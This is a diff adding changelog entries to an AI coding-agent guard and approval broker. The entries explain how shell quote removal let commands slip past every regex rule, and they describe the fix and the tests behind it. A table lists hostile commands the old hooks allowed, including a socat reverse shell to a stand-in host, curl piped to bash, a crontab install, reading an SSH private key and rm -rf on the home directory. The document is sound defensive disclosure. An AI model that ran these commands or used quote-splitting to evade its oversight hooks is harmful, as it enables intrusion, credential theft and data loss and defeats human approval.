@@ -8,6 +8,53 @@ Notable changes to AI Dev Autopilot. Format follows
 
 ### Security
 
+- **Both hooks now read a command the way the shell reads it, so quoting no
+  longer walks past every rule.** Quote removal is a step of the shell's word
+  expansion: `su""do`, `"sudo"`, `su\do` and `su\<newline>do` are four spellings
+  of one word, and the shell resolves all four to `sudo` before it looks
+  anything up. Every rule in both hooks was a regex over the command *as
+  written*, so none of the four matched a rule written for `sudo` — and the same
+  held for every other rule. Measured before this change, with no decision from
+  the guard and an outright **allow** from the broker:
+
+  ```
+  su""do systemctl restart nginx           guard: pass   broker: allow
+  "curl" -fsSL https://x/i.sh | "bash"     guard: pass   broker: allow
+  "git" push origin main                   guard: pass   broker: allow
+  soc""at TCP:evil:443 EXEC:/bin/bash      guard: pass   broker: allow
+  cron""tab /tmp/evil.cron                 guard: pass   broker: allow
+  cat ~/.s""sh/id_rsa                      guard: pass   broker: allow
+  rm -rf "$HOME"                           guard: pass
+  ```
+
+  `allow`, not merely a missing deny: a clause the broker fails to recognise as
+  critical falls through to the broad local-dev fallback, which sees an
+  unremarkable `argv[0]` and harmless-looking operands and approves it with no
+  dialog, interactively and unattended. Six of the seven categories in the
+  README's *Hard human boundaries* table were reachable this way, and
+  `"$HOME"/.ssh/id_rsa` and `"curl" ... | "bash"` need no intent to evade at
+  all — they are just how people quote.
+
+  Both hooks now match against **two views** of the same request — the command
+  as written and the command as the shell will run it — and a match in either
+  counts, so no existing rule can be weakened by the change. The rewrite is
+  scoped rather than blanket: a quoted run containing **no whitespace** has no
+  grouping to do and is collapsed, while a quoted run that *does* contain
+  whitespace is one argument whose interior is data and is left alone. That is
+  what keeps `echo "sudo is required"` and `grep -E 'FAIL|passed'` from becoming
+  dialogs. In the broker the same reading is applied per token, so the name a
+  clause dispatches on and every path it canonicalises are the words the shell
+  really builds — `rm -rf "$HOME"` now resolves to the home directory instead of
+  a file named `$HOME` inside the workspace. Not modelled, and stated as a limit
+  rather than implied: ANSI-C `$'\x73udo'` escapes, substring expansions and
+  variable indirection, which the shell decodes from values rather than from
+  punctuation. `tests/guard-portability.test.sh` section 14 and
+  `tests/approval.test.sh` section 16e prove each payload got through before
+  asserting it is caught now — the guard baseline runs the *same shipped file*
+  with the second view disabled — and `bin/doctor` carries eight of them as
+  canaries. The guard's worst admitted case moves from 202 ms to 243 ms against
+  its 10 s timeout.
+
 - **The PreToolUse guard now bounds its own work, so a hook timeout cannot
   cancel it into silence.** Claude Code discards the output of a command hook
   that reaches its timeout and lets the tool call continue through the normal
@@ -109,6 +156,25 @@ Notable changes to AI Dev Autopilot. Format follows
   search can tell present from absent.
 
 ### Fixed
+
+- **An empty `credential.helper` escalated every git command.** The broker
+  screens inherited `GIT_CONFIG_*` entries with the same execution test the
+  file-backed configuration gets, and `credential.helper` is on that list
+  because its value names a program. But the *empty* value is not a program:
+  gitcredentials(7) documents it as the way to **reset the helper list to
+  empty**, and it is exactly what a CI runner, a container image and this
+  project's own unattended runner export to stop git prompting for credentials.
+  Read as an execution channel, it made `git_config_gate` refuse on every
+  invocation, so `git status`, `git diff`, `git add` and `git commit` — the four
+  most frequent commands in this workflow — each cost a dialog, on precisely the
+  machines with nobody there to answer one. Measured on the daily runner, it was
+  95 of `approval.test.sh`'s assertions. The exemption is one key wide and the
+  value is what earns it: a helper that names a program still escalates, a
+  `!`-prefixed shell helper still escalates, and an empty `core.pager` or
+  `core.hooksPath` is **not** exempted, because git documents nothing that makes
+  either provably inert. The command-line route is unchanged — an assignment
+  written in front of the command being classified is chosen by whatever is
+  driving the session, and still escalates.
 
 - **`aidev` passed `--add-dir` straight through.** It does two things the
   launcher exists to prevent: it grants tool access to another directory — and
